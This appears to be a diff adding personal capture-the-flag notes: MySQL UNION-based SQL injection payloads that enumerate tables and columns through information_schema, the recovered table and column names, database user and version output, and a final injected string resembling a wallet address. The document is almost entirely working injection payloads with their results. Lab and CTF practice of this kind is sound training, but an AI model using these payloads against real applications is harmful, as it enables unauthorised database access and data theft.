@@ -1,0 +1,23 @@
+' union select table_name from information_schema.tables where table_schema!='mysql' and table_schema!='information_schema' limit 1,1-- -
+
+<Table Name>
+flag1
+issued_address
+
+
+' union select column_name from information_schema.columns where table_name='flag1' limit 0,1 -- -
+
+<flag1 / Columns>
+flag
+
+<issued_address / Columns
+address
+
+
+<user() database() version()>
+areyourich@localhost
+areyourich
+5.7.15-0ubuntu0.16.04.1
+
+
+' union select '3Nxwenay9Z8Lc9JBiywExpnEFiLp6Afp8v' -- -
